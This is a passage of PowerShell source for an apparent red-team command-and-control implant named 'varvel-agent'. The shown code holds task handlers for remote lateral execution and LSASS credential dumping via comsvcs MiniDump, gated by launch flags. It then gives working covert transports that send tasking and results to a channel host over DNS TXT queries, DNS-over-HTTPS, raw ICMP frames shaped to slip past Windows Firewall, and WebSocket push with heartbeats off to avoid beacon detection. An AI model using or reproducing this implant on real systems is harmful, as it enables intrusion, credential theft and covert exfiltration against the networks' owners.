      # DOUBLY GATED (engagement ad.lateral AND -AllowLateral); the channel scope-
      # checked the target (IP literal inside the signed CIDR ring). CLEANUP-PROOF:
      # every created artifact (service/result file) is removed and re-read absent;
      # the manifest records services created, files dropped, shares touched.
      if (-not $AllowLateral) {
        return [Text.Encoding]::UTF8.GetBytes('lateral-exec REFUSED: agent-side lateral execution is OFF (launch with -AllowLateral; the engagement ad.lateral gate must also be on) - nothing executed, nothing created on any target')
      }
      try {
        $spec = $Task.data | ConvertFrom-Json
        $nm = 'vx-' + (Get-Sha256Hex ([Text.Encoding]::UTF8.GetBytes($AgentId + '|' + $Url))).Substring(0, 8)
        if ($spec.name -and ([string]$spec.name).Trim().Length -gt 0) { $nm = [string]$spec.name }
        $job = @{ name = $nm; adapter = ([string]$spec.adapter).ToLower(); target = [string]$spec.target; command = [string]$spec.command }
        if ($spec.user) { $job.user = [string]$spec.user }
        if ($spec.domain) { $job.domain = [string]$spec.domain }
        if ($null -ne $spec.password) { $job.password = [string]$spec.password }
        $ev = Invoke-VvLateralExec $job $script:VvLateralManifestPath
        $names = @{}; $names[$nm] = $ev
        return [Text.Encoding]::UTF8.GetBytes((ConvertTo-Json ([ordered]@{ op = 'ran'; pid = $PID; state = $ev.state; names = $names; at = (Get-Date).ToUniversalTime().ToString('o') }) -Compress -Depth 8))
      } catch { return [Text.Encoding]::UTF8.GetBytes("lateral-exec failed: $($_.Exception.Message)") }
    }
    'lateral-remove' {
      # The standing cleanup leg: take back any lingering artifact under a name (or
      # all), verified by re-read. A removal that cannot verify is 'removal-failed' -
      # LOUD, escalated channel-side as lateral.remove-failed.
      if (-not $AllowLateral) {
        return [Text.Encoding]::UTF8.GetBytes('lateral-remove REFUSED: agent-side lateral execution is OFF (launch with -AllowLateral; the engagement ad.lateral gate must also be on) - nothing removed')
      }
      try {
        $spec = $Task.data | ConvertFrom-Json
        $job = @{ all = ($spec.all -eq $true) }
        if ($spec.name -and ([string]$spec.name).Trim().Length -gt 0) { $job.name = [string]$spec.name }
        if ($spec.user) { $job.user = [string]$spec.user }
        if ($spec.domain) { $job.domain = [string]$spec.domain }
        if ($null -ne $spec.password) { $job.password = [string]$spec.password }
        return [Text.Encoding]::UTF8.GetBytes((ConvertTo-Json (Invoke-VvLateralRemove $job $script:VvLateralManifestPath) -Compress -Depth 8))
      } catch { return [Text.Encoding]::UTF8.GetBytes("lateral-remove failed: $($_.Exception.Message)") }
    }
    'lateral-status' {
      # The sweep: every manifest entry re-probed LIVE (measured now); clean ONLY
      # when zero artifacts remain present/removal-unverified.
      if (-not $AllowLateral) {
        return [Text.Encoding]::UTF8.GetBytes('lateral-status REFUSED: agent-side lateral execution is OFF (launch with -AllowLateral; the engagement ad.lateral gate must also be on) - no state reported')
      }
      try {
        $job = @{}
        if ($Task.data -and "$($Task.data)".Trim().Length -gt 0 -and "$($Task.data)".Trim() -ne '{}') {
          $spec = $Task.data | ConvertFrom-Json
          if ($spec.name -and ([string]$spec.name).Trim().Length -gt 0) { $job.name = [string]$spec.name }
        }
        return [Text.Encoding]::UTF8.GetBytes((ConvertTo-Json (Invoke-VvLateralStatus $job $script:VvLateralManifestPath) -Compress -Depth 8))
      } catch { return [Text.Encoding]::UTF8.GetBytes("lateral-status failed: $($_.Exception.Message)") }
    }
    'cred-dump' {
      # GOVERNED AD TIER rung 3: LSASS via the comsvcs MiniDump LOLBin - see
      # ==CREDHOST-LIB==. DOUBLY GATED (engagement cred.access AND -AllowCredAccess).
      # The dump lands in THIS agent's governed sandbox and NEVER rides the channel;
      # the evidence carries sha256 + bytes + the MINIDUMP marker verdict only.
      # edrview pairing is MANDATORY - LSASS access is the most-watched event in
      # enterprise defense; the measure is the point.
      if (-not $AllowCredAccess) {
        return [Text.Encoding]::UTF8.GetBytes('cred-dump REFUSED: agent-side credential access is OFF (launch with -AllowCredAccess; the engagement cred.access gate must also be on) - no dump was attempted')
      }
      try {
        $spec = $Task.data | ConvertFrom-Json
        $nm = 'cred-' + (Get-Sha256Hex ([Text.Encoding]::UTF8.GetBytes($AgentId + '|' + $Url))).Substring(0, 8)
        if ($spec.name -and ([string]$spec.name).Trim().Length -gt 0) { $nm = [string]$spec.name }
        $job = @{ name = $nm }
        if ($spec.pid) { $job.pid = [int]$spec.pid }
        $ev = Invoke-VvCredDump $job $Sandbox $script:VvCredManifestPath
        $names = @{}; $names[$nm] = $ev
        return [Text.Encoding]::UTF8.GetBytes((ConvertTo-Json ([ordered]@{ op = 'dump'; pid = $PID; state = $ev.state; names = $names; at = (Get-Date).ToUniversalTime().ToString('o') }) -Compress -Depth 8))
      } catch { return [Text.Encoding]::UTF8.GetBytes("cred-dump failed: $($_.Exception.Message)") }
    }
    'cred-dump-remove' {
      # The mandatory cleanup half: hash-guarded delete (we never delete bytes we did
      # not write), then VERIFY absence by re-read. Loud 'removal-failed' otherwise.
      if (-not $AllowCredAccess) {
        return [Text.Encoding]::UTF8.GetBytes('cred-dump-remove REFUSED: agent-side credential access is OFF (launch with -AllowCredAccess; the engagement cred.access gate must also be on) - nothing removed')
      }
      try {
        $spec = $Task.data | ConvertFrom-Json
        $job = @{ all = ($spec.all -eq $true) }
        if ($spec.name -and ([string]$spec.name).Trim().Length -gt 0) { $job.name = [string]$spec.name }
        return [Text.Encoding]::UTF8.GetBytes((ConvertTo-Json (Invoke-VvCredRemove $job $script:VvCredManifestPath) -Compress -Depth 8))
      } catch { return [Text.Encoding]::UTF8.GetBytes("cred-dump-remove failed: $($_.Exception.Message)") }
    }
    'cred-dump-status' {
      # The sweep: every manifest dump re-probed LIVE; clean ONLY when no dump file
      # persists. Lands channel-side as 'cred.dump-status'.
      if (-not $AllowCredAccess) {
        return [Text.Encoding]::UTF8.GetBytes('cred-dump-status REFUSED: agent-side credential access is OFF (launch with -AllowCredAccess; the engagement cred.access gate must also be on) - no state reported')
      }
      try { return [Text.Encoding]::UTF8.GetBytes((ConvertTo-Json (Invoke-VvCredStatus $script:VvCredManifestPath) -Compress -Depth 8)) }
      catch { return [Text.Encoding]::UTF8.GetBytes("cred-dump-status failed: $($_.Exception.Message)") }
    }
    default { return [Text.Encoding]::UTF8.GetBytes("unknown task kind: $($Task.kind)") }
  }
}

Write-Host "varvel-agent $AgentId -> $Url - sandbox $Sandbox - cadence $Interval+/-$Jitter ms - transport $Transport"

# ---------- DNS transport (codec parity with varvel/engine/dnscodec.mjs + dnswire.mjs) ----------
$B32_CHARS = '0123456789abcdefghijklmnopqrstuv'
function ConvertTo-B32([byte[]]$Bytes) {
  $bits = 0; $value = 0; $out = ''
  foreach ($b in $Bytes) {
    $value = ($value -shl 8) -bor $b; $bits += 8
    while ($bits -ge 5) { $out += $B32_CHARS[($value -shr ($bits - 5)) -band 31]; $bits -= 5 }
  }
  if ($bits -gt 0) { $out += $B32_CHARS[($value -shl (5 - $bits)) -band 31] }
  return $out
}
function ConvertFrom-B32([string]$s) {
  $s = $s.ToLower()
  $bytes = New-Object System.Collections.Generic.List[byte]
  $bits = 0; $value = 0
  foreach ($ch in $s.ToCharArray()) {
    $idx = $B32_CHARS.IndexOf($ch)
    if ($idx -lt 0) { return $null }
    $value = ($value -shl 5) -bor $idx; $bits += 5
    if ($bits -ge 8) { $bytes.Add(($value -shr ($bits - 8)) -band 255); $bits -= 8 }
  }
  return $bytes.ToArray()
}
function Get-EncodedQuery($Obj, $Domain) {
  $json = ($Obj | ConvertTo-Json -Compress)
  $enc = ConvertTo-B32 ([Text.Encoding]::UTF8.GetBytes($json))
  $labels = New-Object System.Collections.Generic.List[string]
  for ($i = 0; $i -lt $enc.Length; $i += 63) { $labels.Add($enc.Substring($i, [Math]::Min(63, $enc.Length - $i))) }
  $labels.Add($Domain)
  return ($labels -join '.')
}
function Invoke-DnsHttp([string]$Qname) {
  try {
    $wc = New-Object System.Net.WebClient
    $bytes = $wc.DownloadData("$Url/d/$Qname")
    $script:LastPullOk = $true   # any HTTP response = wire alive
    if ($null -eq $bytes -or $bytes.Length -eq 0) { return '' }
    return ([Text.Encoding]::UTF8.GetString($bytes))
  } catch { $script:LastPullOk = $false; return '' }
}
function New-DnsQueryPacket([string]$Qname) {
  # craft the wire packet: header + labels + TXT/IN (shared by the dns-udp AND doh wires)
  $ms = New-Object System.IO.MemoryStream
  $bw = New-Object System.IO.BinaryWriter($ms)
  $id = Get-Random -Minimum 0 -Maximum 65535
  foreach ($v in @(($id -shr 8), ($id -band 255), 1, 0, 0, 1, 0, 0, 0, 0, 0, 0)) { $bw.Write([byte]$v) }  # parens are LOAD-BEARING: comma binds tighter than -shr/-band in PS - unparenthesized, $v becomes an Object[] and the [byte] cast throws (latent since the dns-udp transport shipped; first exercised by gap#5 failover)
  foreach ($label in $Qname.Split('.')) {
    if ($label.Length -gt 0) { $bw.Write([byte]$label.Length); $bw.Write([Text.Encoding]::ASCII.GetBytes($label)) }
  }
  $bw.Write([byte]0)
  foreach ($v in @(0, 16, 0, 1)) { $bw.Write([byte]$v) }  # TXT, IN
  $bw.Flush()
  return ,$ms.ToArray()
}
function Invoke-DnsUdp([string]$Qname, [int]$TimeoutMs = 8000) {
  $packet = New-DnsQueryPacket $Qname
  $uhp = $Url -replace '^https?://', ''
  $parts = $uhp.Split(':')
  $server = $parts[0]
  $port = 5335
  if ($parts.Length -gt 1) { $port = [int]$parts[1] }
  if ($DnsPort -gt 0) { $port = $DnsPort }  # explicit -DnsPort wins (failover: one -Url, two wire ports)
  $udp = New-Object System.Net.Sockets.UdpClient
  try {
    $udp.Client.ReceiveTimeout = $TimeoutMs
    $udp.Connect($server, $port)
    [void]$udp.Send($packet, $packet.Length)
    $remote = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, 0)
    $reply = $udp.Receive([ref]$remote)
    $script:LastPullOk = $true   # ANY reply packet = wire alive (incl. zero-answer TXT = idle-but-heard)
    return (Read-TxtAnswer $reply)
  } catch { $script:LastPullOk = $false; return '' }
  finally { $udp.Close() }
}
function Read-TxtAnswer([byte[]]$buf) {
  try {
    $an = ($buf[6] -shl 8) -bor $buf[7]
    if ($an -eq 0) { return '' }
    $off = 12
    while ($buf[$off] -ne 0) { $off += 1 + $buf[$off] }
    $off += 5
    $rdlen = ($buf[$off + 10] -shl 8) -bor $buf[$off + 11]
    $p = $off + 12
    $end = $p + $rdlen
    $out = ''
    while ($p -lt $end) { $l = $buf[$p]; $p++; $out += [Text.Encoding]::ASCII.GetString($buf, $p, $l); $p += $l }
    return $out
  } catch { return $null }
}
function Invoke-DnsRoundTrip($QueryObj) {
  $qname = Get-EncodedQuery $QueryObj $DnsDomain
  if ($Transport -eq 'dns-udp') { return (Invoke-DnsUdp $qname) }
  return (Invoke-DnsHttp $qname)
}
function Invoke-DnsPull {
  $script:Seq++
  $h = Get-HmacHex $Token ($AgentId + ':' + $script:Seq + ':pull')
  $reply = Invoke-DnsRoundTrip ([ordered]@{ a = $AgentId; s = $script:Seq; h = $h })
  if ([string]::IsNullOrEmpty($reply)) { return $null }
  $bytes = ConvertFrom-B32 $reply
  if ($null -eq $bytes) { return $null }
  try {
    $t = [Text.Encoding]::UTF8.GetString($bytes) | ConvertFrom-Json
    # Channel-assigned transport switch rides the task reply as a machine-only key (gap#5).
    if ($t -and $t.setTransport) { $script:AssignedTransport = ([string]$t.setTransport).Trim().ToLower() }
    return $t
  } catch { return $null }
}
function Invoke-DnsPush([string]$TaskId, [byte[]]$Body) {
  $chunkSize = 96
  $chunks = New-Object System.Collections.Generic.List[string]
  for ($i = 0; $i -lt $Body.Length; $i += $chunkSize) {
    $len = [Math]::Min($chunkSize, $Body.Length - $i)
    $chunk = New-Object byte[] $len
    [Array]::Copy($Body, $i, $chunk, 0, $len)
    $chunks.Add([Convert]::ToBase64String($chunk))
  }
  if ($chunks.Count -eq 0) { $chunks.Add([Convert]::ToBase64String([byte[]]@())) }
  $n = $chunks.Count
  for ($i = 0; $i -lt $n; $i++) {
    $script:Seq++
    $d = $chunks[$i]
    $h = Get-HmacHex $Token ($AgentId + ':' + $script:Seq + ':' + $TaskId + ':' + $i + ':' + $n + ':' + $d)
    [void](Invoke-DnsRoundTrip ([ordered]@{ a = $AgentId; s = $script:Seq; h = $h; t = $TaskId; k = 'push'; i = $i; n = $n; d = $d }))
  }
}

# ---------- DoH transport (gap#2): RFC 8484 DNS-over-HTTPS ----------
# The SAME governed wire packet as dns-udp (New-DnsQueryPacket / Read-TxtAnswer, same
# codec objects), TLS-carried to $DohUrl as application/dns-message. Governance is
# identical (HMAC/seq in the query name); only the envelope changes.
function Set-DohTlsPin([string]$Thumb) {
  # THUMBPRINT PIN, never a bypass: the callback returns $true ONLY when the server
  # cert's SHA256 hash equals the pinned thumbprint. An unconditional $true here would
  # trust ANY certificate (the classic RCE-grade misconfig) - we pin exactly one cert
  # (the lab cert by default, or the operator's via -DohThumbprint); everything else
  # fails the handshake and the pull reports the wire dead.
  $script:DohPinnedThumb = $Thumb.ToUpper()
  [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {
    param($sender, $cert, $chain, $sslPolicyErrors)
    if ($null -eq $cert) { return $false }
    return ($cert.GetCertHashString([System.Security.Cryptography.HashAlgorithmName]::SHA256) -eq $script:DohPinnedThumb)
  }
}
function Invoke-DohRoundTrip([string]$Qname) {
  $packet = New-DnsQueryPacket $Qname
  try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add('content-type', 'application/dns-message')
    $reply = $wc.UploadData($DohUrl, 'POST', $packet)
    $script:LastPullOk = $true   # ANY HTTP response = wire alive (incl. zero-answer 200 = idle-but-heard)
    return (Read-TxtAnswer $reply)
  } catch [System.Net.WebException] {
    # A WebException WITH a Response still means SOMETHING answered on the wire (400/404/5xx).
    $script:LastPullOk = ($null -ne $_.Exception.Response)
    return ''
  } catch { $script:LastPullOk = $false; return '' }  # no route / TLS pin mismatch = dead wire
}
function Invoke-DohPull {
  $script:Seq++
  $h = Get-HmacHex $Token ($AgentId + ':' + $script:Seq + ':pull')
  $qname = Get-EncodedQuery ([ordered]@{ a = $AgentId; s = $script:Seq; h = $h }) $DnsDomain
  $reply = Invoke-DohRoundTrip $qname
  if ([string]::IsNullOrEmpty($reply)) { return $null }
  $bytes = ConvertFrom-B32 $reply
  if ($null -eq $bytes) { return $null }
  try {
    $t = [Text.Encoding]::UTF8.GetString($bytes) | ConvertFrom-Json
    # Channel-assigned transport switch rides the task reply as a machine-only key (gap#5).
    if ($t -and $t.setTransport) { $script:AssignedTransport = ([string]$t.setTransport).Trim().ToLower() }
    return $t
  } catch { return $null }
}
function Invoke-DohPush([string]$TaskId, [byte[]]$Body) {
  # Same 96-byte payload chunking as DNS: uniform query sizes across the codec wires.
  $chunkSize = 96
  $chunks = New-Object System.Collections.Generic.List[string]
  for ($i = 0; $i -lt $Body.Length; $i += $chunkSize) {
    $len = [Math]::Min($chunkSize, $Body.Length - $i)
    $chunk = New-Object byte[] $len
    [Array]::Copy($Body, $i, $chunk, 0, $len)
    $chunks.Add([Convert]::ToBase64String($chunk))
  }
  if ($chunks.Count -eq 0) { $chunks.Add([Convert]::ToBase64String([byte[]]@())) }
  $n = $chunks.Count
  for ($i = 0; $i -lt $n; $i++) {
    $script:Seq++
    $d = $chunks[$i]
    $h = Get-HmacHex $Token ($AgentId + ':' + $script:Seq + ':' + $TaskId + ':' + $i + ':' + $n + ':' + $d)
    $qname = Get-EncodedQuery ([ordered]@{ a = $AgentId; s = $script:Seq; h = $h; t = $TaskId; k = 'push'; i = $i; n = $n; d = $d }) $DnsDomain
    [void](Invoke-DohRoundTrip $qname)
  } # push queries expect no application reply (uniform with the DNS wire's zero-answer)
}

# ---------- ICMP transport (codec parity with varvel/engine/icmpcodec.mjs) ----------
# Real ICMP wire: VARVEL echo frames over a raw socket (System.Net.Sockets Raw/Icmp -
# needs Administrator/SYSTEM; the range agent runs as SYSTEM). The frame carries the SAME
# governed DNS-codec query string as the other transports; governance (HMAC/seq) is
# identical, only the envelope changes. The channel terminates this via its native bridge.
function Get-InetChecksum([byte[]]$Data) {
  $sum = [int64]0
  $n = $Data.Length - ($Data.Length % 2)
  for ($i = 0; $i -lt $n; $i += 2) { $sum += ([int64]$Data[$i] * 256) + [int64]$Data[$i + 1] }
  if ($Data.Length % 2) { $sum += [int64]$Data[$Data.Length - 1] * 256 }
  while ($sum -gt 65535) { $sum = ($sum -band 0xffff) + ($sum -shr 16) }
  return [int]((-bnot $sum) -band 0xffff)
}
# kind: 1=pull 2=push 3=reply (codec map). Seq32 ties replies to requests.
function Get-IcmpPacket([int]$Type, [int64]$Seq32, [int]$Kind, [int]$Idx, [int]$Cnt, [byte[]]$Payload) {
  if ($Payload.Length -gt 512) { throw 'icmp frame payload > 512 (chunk it)' }
  $packet = New-Object byte[] (21 + $Payload.Length)
  $packet[0] = [byte]$Type; $packet[1] = 0; $packet[2] = 0; $packet[3] = 0  # type, code, checksum(placeholder)
  $packet[4] = 0x56; $packet[5] = 0x01                                     # id 0x5601
  # NB: [byte] is a CHECKED cast in PowerShell - every multi-byte field masks with
  # -band 0xff first or a value >255 throws InvalidCast at runtime.
  $packet[6] = [byte](($Seq32 -shr 8) -band 0xff); $packet[7] = [byte]($Seq32 -band 0xff)   # echo seq (low 16)
  $packet[8] = 0x56; $packet[9] = 0x43                                     # magic 'VC'
  $packet[10] = [byte]$Kind
  $packet[11] = [byte](($Seq32 -shr 24) -band 0xff); $packet[12] = [byte](($Seq32 -shr 16) -band 0xff); $packet[13] = [byte](($Seq32 -shr 8) -band 0xff); $packet[14] = [byte]($Seq32 -band 0xff)
  $packet[15] = [byte](($Idx -shr 8) -band 0xff); $packet[16] = [byte]($Idx -band 0xff)
  $packet[17] = [byte](($Cnt -shr 8) -band 0xff); $packet[18] = [byte]($Cnt -band 0xff)
  $packet[19] = [byte](($Payload.Length -shr 8) -band 0xff); $packet[20] = [byte]($Payload.Length -band 0xff)
  if ($Payload.Length -gt 0) { [Array]::Copy($Payload, 0, $packet, 21, $Payload.Length) }
  $cs = Get-InetChecksum $packet
  $packet[2] = [byte](($cs -shr 8) -band 0xff); $packet[3] = [byte]($cs -band 0xff)
  return ,$packet
}
function Read-IcmpPacket([byte[]]$buf) {
  try {
    if ($buf.Length -lt 21) { return $null }
    if ((Get-InetChecksum $buf) -ne 0) { return $null }
    if ($buf[0] -ne 8 -and $buf[0] -ne 0) { return $null }
    if ($buf[1] -ne 0) { return $null }
    if ($buf[8] -ne 0x56 -or $buf[9] -ne 0x43) { return $null }   # not VARVEL - kernel noise
    $kind = switch ([int]$buf[10]) { 1 {'pull'} 2 {'push'} 3 {'reply'} default { $null } }
    if (-not $kind) { return $null }
    $seq = ([int64]$buf[11] * 16777216) + ([int64]$buf[12] * 65536) + ([int64]$buf[13] * 256) + [int64]$buf[14]
    $idx = ([int]$buf[15] * 256) + [int]$buf[16]
    $cnt = ([int]$buf[17] * 256) + [int]$buf[18]
    $dlen = ([int]$buf[19] * 256) + [int]$buf[20]
    if ($cnt -lt 1 -or $cnt -gt 5000 -or $idx -ge $cnt) { return $null }
    if (21 + $dlen -ne $buf.Length) { return $null }
    $data = New-Object byte[] $dlen
    if ($dlen -gt 0) { [Array]::Copy($buf, 21, $data, 0, $dlen) }
    return @{ type = [int]$buf[0]; seq = $seq; kind = $kind; idx = $idx; cnt = $cnt; data = $data }
  } catch { return $null }
}
$script:IcmpSock = $null
$script:IcmpEndPoint = $null
function Connect-Icmp {
  # raw sockets need elevation; fail LOUDLY here (the boot log must say why, not hang)
  $h = ($Url -replace '^[a-z]+://', '').Split(':')[0].Trim('/')
  $script:IcmpSock = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Raw, [System.Net.Sockets.ProtocolType]::Icmp)
  # Win11 24H2 receive contract (range-proven, matrix5): a raw ICMP socket only surfaces
  # inbound frames when it is (a) bound to the SPECIFIC local interface IP - not Any -
  # and (b) given SIO_RCVALL. Bind(Any) without RCVALL receives NOTHING on 24H2 guests
  # (every wire shape arrived: zero frames; RCVALL+specific-bind: replies instantly).
  # Resolve the local IP facing the channel via a UDP connect (no traffic is sent).
  $localIp = $null
  try {
    $u = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Dgram, [System.Net.Sockets.ProtocolType]::Udp)
    $u.Connect([System.Net.IPAddress]::Parse($h), 53)
    $localIp = $u.LocalEndPoint.Address
    $u.Close()
  } catch { Write-Host ('  [icmp: local-IP resolve failed, falling back to Any: ' + $_.Exception.Message + ']') }
  if ($null -eq $localIp) { $localIp = [System.Net.IPAddress]::Any }
  $script:IcmpSock.Bind((New-Object System.Net.IPEndPoint($localIp, 0)))
  try { $script:IcmpSock.IOControl([System.Net.Sockets.IOControlCode]::ReceiveAll, [byte[]](1, 0, 0, 0), $null) } catch { Write-Host ('  [icmp: RCVALL refused: ' + $_.Exception.Message + ']') }
  # ReceiveTimeout is MANDATORY: without it ReceiveFrom blocks forever, and one silent
  # wire hangs the agent (and the foothold's shell task with it - verified twice).
  # 1s granularity lets the pull deadline stay responsive between receives.
  $script:IcmpSock.ReceiveTimeout = 1000
  $script:IcmpEndPoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Parse($h), 0)
}
function Receive-IcmpFrame {
  # One inbound VARVEL frame (IP header stripped) or $null on timeout/noise.
  $buf = New-Object byte[] 65535
  $remote = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, 0)
  $n = 0
  try { $n = $script:IcmpSock.ReceiveFrom($buf, [ref]$remote) } catch { return $null }
  if ($n -lt 21) { return $null }
  $data = New-Object byte[] $n
  [Array]::Copy($buf, 0, $data, 0, $n)
  if ($n -ge 20 -and ($data[0] -shr 4) -eq 4) {   # raw sockets deliver the IPv4 header too
    $ihl = ($data[0] -band 0x0F) * 4
    if ($ihl -ge 20 -and $ihl -le $n) { $s = New-Object byte[] ($n - $ihl); [Array]::Copy($data, $ihl, $s, 0, ($n - $ihl)); $data = $s }
  }
  $f = Read-IcmpPacket $data
  if ($null -eq $f) { return $null }
  $f.src = $remote.Address.ToString()
  return $f
}
function Invoke-IcmpPull {
  $script:Seq++
  $h = Get-HmacHex $Token ($AgentId + ':' + $script:Seq + ':pull')
  $q = Get-EncodedQuery ([ordered]@{ a = $AgentId; s = $script:Seq; h = $h }) $DnsDomain
  # Frame as an echo REPLY (type 0), not a request: Windows Firewall's default inbound
  # echo-REQUEST rule (public profiles) drops type 8 before raw sockets see it, while
  # unsolicited replies are not filtered - agent->channel frames ride type 0. We send
  # NO echo requests ever: on Win11 24H2 the kernel's echo path CLAIMS inbound echo
  # replies that match an outstanding request, hiding them from our RCVALL socket
  # (range-proven: the probe saw 4 replies for other agents, never its own). No
  # requests + the channel's non-matching reply id (0x5602) = replies always delivered.
  $script:LastPullOk = $false  # proven below by ANY reply frame (the channel answers idle pulls with an empty reply by design)
  $pkt = Get-IcmpPacket 0 ([int64]$script:Seq) 1 0 1 ([Text.Encoding]::UTF8.GetBytes($q))
  try { [void]$script:IcmpSock.SendTo($pkt, $script:IcmpEndPoint) } catch { Write-Host ('  [icmp send failed: ' + $_.Exception.Message + ']'); $script:Seq--; return $null }
  # Await the channel's reply frames (kind 'reply', our VC seq). The channel frames
  # replies as echo REQUESTS (type 8, id 0x5602): python raw-socket type-0 sends are
  # silently dropped off-loopback, while type 8 crosses (range matrix7) and our RCVALL
  # socket sees it despite the kernel consuming a copy for its auto-answer. That
  # auto-answer is a VERBATIM duplicate of the reply body (same VC seq/idx) - harmless
  # to reassembly. Read-IcmpPacket accepts types 0/8; the match key is VC seq32.
  $sw = [Diagnostics.Stopwatch]::StartNew()
  $frames = @{}
  $need = -1
  while ($sw.ElapsedMilliseconds -lt 8000) {
    $f = Receive-IcmpFrame
    if ($null -eq $f) { if ($sw.ElapsedMilliseconds -ge 8000) { break } else { continue } }
    if ($f.kind -ne 'reply' -or $f.seq -ne [int64]$script:Seq) { continue }
    $script:LastPullOk = $true   # a reply frame arrived: the icmp wire is alive (even an empty idle reply)
    if ($need -lt 0) { $need = $f.cnt }
    if ($f.cnt -ne $need) { return $null }                      # shape conflict - fail closed
    $frames[$f.idx] = $f.data
    if ($frames.Count -ge $need) { break }
  }
  if ($need -lt 0 -or $frames.Count -lt $need) { return $null } # idle/timeout - same shape as DNS ''
  $total = 0; foreach ($k in $frames.Keys) { $total += $frames[$k].Length }
  $body = New-Object byte[] $total
  $off = 0
  for ($i = 0; $i -lt $need; $i++) { [Array]::Copy($frames[$i], 0, $body, $off, $frames[$i].Length); $off += $frames[$i].Length }
  $reply = [Text.Encoding]::UTF8.GetString($body)
  if ([string]::IsNullOrEmpty($reply)) { return $null }
  $bytes = ConvertFrom-B32 $reply
  if ($null -eq $bytes) { return $null }
  try {
    $t = [Text.Encoding]::UTF8.GetString($bytes) | ConvertFrom-Json
    # Channel-assigned transport switch rides the task reply as a machine-only key (gap#5).
    if ($t -and $t.setTransport) { $script:AssignedTransport = ([string]$t.setTransport).Trim().ToLower() }
    return $t
  } catch { return $null }
}
function Invoke-IcmpPush([string]$TaskId, [byte[]]$Body) {
  # Same 96-byte payload chunking as DNS: each push query stays a single frame (~430B < 512).
  $chunkSize = 96
  $chunks = New-Object System.Collections.Generic.List[string]
  for ($i = 0; $i -lt $Body.Length; $i += $chunkSize) {
    $len = [Math]::Min($chunkSize, $Body.Length - $i)
    $chunk = New-Object byte[] $len
    [Array]::Copy($Body, $i, $chunk, 0, $len)
    $chunks.Add([Convert]::ToBase64String($chunk))
  }
  if ($chunks.Count -eq 0) { $chunks.Add([Convert]::ToBase64String([byte[]]@())) }
  $n = $chunks.Count
  for ($i = 0; $i -lt $n; $i++) {
    $script:Seq++
    $d = $chunks[$i]
    $h = Get-HmacHex $Token ($AgentId + ':' + $script:Seq + ':' + $TaskId + ':' + $i + ':' + $n + ':' + $d)
    $q = Get-EncodedQuery ([ordered]@{ a = $AgentId; s = $script:Seq; h = $h; t = $TaskId; k = 'push'; i = $i; n = $n; d = $d }) $DnsDomain
    $pkt = Get-IcmpPacket 0 ([int64]$script:Seq) 2 0 1 ([Text.Encoding]::UTF8.GetBytes($q))
    try { [void]$script:IcmpSock.SendTo($pkt, $script:IcmpEndPoint) } catch { Write-Host ('  [icmp push failed: ' + $_.Exception.Message + ']') }
    # PACING IS MANDATORY: frames are fire-and-forget (no ACK, no retransmit - uniform
    # with the DNS wire), and an unpaced burst overruns the raw-socket drain on the
    # channel side: one lost frame kills the whole reassembly SILENTLY (range-proven:
    # 4-frame pushes land, a 15-frame burst never did). 30ms keeps the wire lossless
    # (15 frames ~= 0.5s; even a 60KB max result ~= 19s, well inside task patience).
    if ($i -lt ($n - 1)) { Start-Sleep -Milliseconds 30 }
  } # push frames expect no application reply (uniform with the DNS wire's zero-answer)
}

# ---------- WebSocket transport (gap#4): RFC 6455 PUSH wire on the channel http server ----------
# The FIRST push transport: the channel delivers a task frame the instant it is queued -
# there is NO pull cadence on this wire (polling periodicity is the beacon signal this
# transport exists to kill). Consequently NO app-level heartbeat lives here either:
# ping/pong keep-alives would recreate that same wire periodicity. Liveness is the
# cycle's receive timeout + socket state, and a dead wire fails over like any other.
# Serial-loop only: sync .Wait() wrappers with CancellationTokenSource deadlines, no
# background threads (same model as the rest of this agent).
function Connect-Ws {
  # One governed handshake: GET /ws?a=<id>&s=<seq>&h=<hmac(token, id:seq:ws)> - the SAME
  # Get-HmacHex, the pull shape with context 'ws'. A denial is an observable 403 (the
  # documented ws shape - not the dns zero-answer), surfacing here as a connect error.
  $script:Seq++
  $h = Get-HmacHex $Token ($AgentId + ':' + $script:Seq + ':ws')
  $u = $Url -replace '^https?://', ''
  $ws = New-Object System.Net.WebSockets.ClientWebSocket
  try {
    # Disable keep-alive pings explicitly: heartbeats recreate the beacon periodicity
    # this transport exists to kill. Liveness is agent-side, not wire chatter.
    $ws.Options.KeepAliveInterval = [TimeSpan]::Zero
    $cts = New-Object System.Threading.CancellationTokenSource(8000)
    try { $ws.ConnectAsync([Uri]('ws://' + $u + '/ws?a=' + $AgentId + '&s=' + $script:Seq + '&h=' + $h), $cts.Token).Wait() }
    finally { $cts.Dispose() }
  } catch {
    try { $ws.Dispose() } catch {}
    throw ('ws connect failed: ' + $_.Exception.Message)
  }
  $script:WsBuf = New-Object byte[] 65536
  $script:WsRecvTask = $null
  $script:WsSock = $ws
}
function Close-Ws {
  if ($null -ne $script:WsSock) {
    try {
      if ($script:WsSock.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
        $cts = New-Object System.Threading.CancellationTokenSource(1500)
        try { [void]$script:WsSock.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, 'cycle-end', $cts.Token).Wait(2000) }
        finally { $cts.Dispose() }
      }
    } catch {}  # a wedged socket is disposed below either way - never hang the loop
    try { $script:WsSock.Dispose() } catch {}
    $script:WsSock = $null
  }
  $script:WsRecvTask = $null
}
function Receive-WsMessage([int]$TimeoutMs) {
  # One COMPLETE text message from the ws wire, or $null. A timeout is idle-but-heard
  # (the pending receive SURVIVES for the next cycle - we never cancel it: on .NET 4.8
  # cancelling a pending ClientWebSocket receive can abort the whole socket). A fault,
  # close frame, or mid-message stall closes the socket; the caller tells the cases
  # apart by re-checking the socket state.
  if ($null -eq $script:WsSock -or $script:WsSock.State -ne [System.Net.WebSockets.WebSocketState]::Open) { return $null }
  $ms = New-Object System.IO.MemoryStream
  $first = $true
  while ($true) {
    if ($null -eq $script:WsRecvTask) {
      $seg = [System.ArraySegment[byte]]::new($script:WsBuf)
      try { $script:WsRecvTask = $script:WsSock.ReceiveAsync($seg, [System.Threading.CancellationToken]::None) }
